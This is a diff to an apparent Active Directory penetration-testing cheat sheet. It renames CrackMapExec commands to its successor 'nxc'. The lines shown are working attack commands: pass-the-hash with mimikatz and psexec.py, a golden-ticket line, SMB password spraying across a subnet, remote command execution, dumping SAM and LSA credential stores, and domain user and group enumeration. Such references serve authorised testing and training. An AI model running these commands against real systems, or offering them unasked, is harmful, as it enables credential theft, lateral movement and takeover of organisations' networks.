@@ -184,8 +184,8 @@ sekurlsa::pth /user:administrator /domain:domain.local /ntlm:hash /run:cmd.exe
 **Linux:**
 ```bash
 # CrackMapExec
-crackmapexec smb 10.10.10.10 -u administrator -H hash
-crackmapexec smb 10.10.10.10 -u administrator -H hash -x whoami
+nxc smb 10.10.10.10 -u administrator -H hash
+nxc smb 10.10.10.10 -u administrator -H hash -x whoami
 
 # psexec
 psexec.py -hashes :hash administrator@10.10.10.10
@@ -269,17 +269,17 @@ kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /tar
 **CrackMapExec:**
 ```bash
 # SMB spray
-crackmapexec smb 10.10.10.0/24 -u user -p password
+nxc smb 10.10.10.0/24 -u user -p password
 
 # Execute commands
-crackmapexec smb 10.10.10.10 -u admin -p password -x whoami
-crackmapexec smb 10.10.10.10 -u admin -H hash -x whoami
+nxc smb 10.10.10.10 -u admin -p password -x whoami
+nxc smb 10.10.10.10 -u admin -H hash -x whoami
 
 # Dump SAM
-crackmapexec smb 10.10.10.10 -u admin -p password --sam
+nxc smb 10.10.10.10 -u admin -p password --sam
 
 # Dump LSA
-crackmapexec smb 10.10.10.10 -u admin -p password --lsa
+nxc smb 10.10.10.10 -u admin -p password --lsa
 ```
 
 **PSExec Variants:**
@@ -322,8 +322,8 @@ Get-DomainGroupMember "Domain Admins"
 **Linux Enumeration:**
 ```bash
 # crackmapexec
-crackmapexec smb 10.10.10.0/24 -u user -p password --users
-crackmapexec smb 10.10.10.0/24 -u user -p password --groups
+nxc smb 10.10.10.0/24 -u user -p password --users
+nxc smb 10.10.10.0/24 -u user -p password --groups
 
 # ldapsearch
 ldapsearch -x -H ldap://10.10.10.10 -D 'user@domain.local' -w 'password' -b "DC=domain,DC=local"
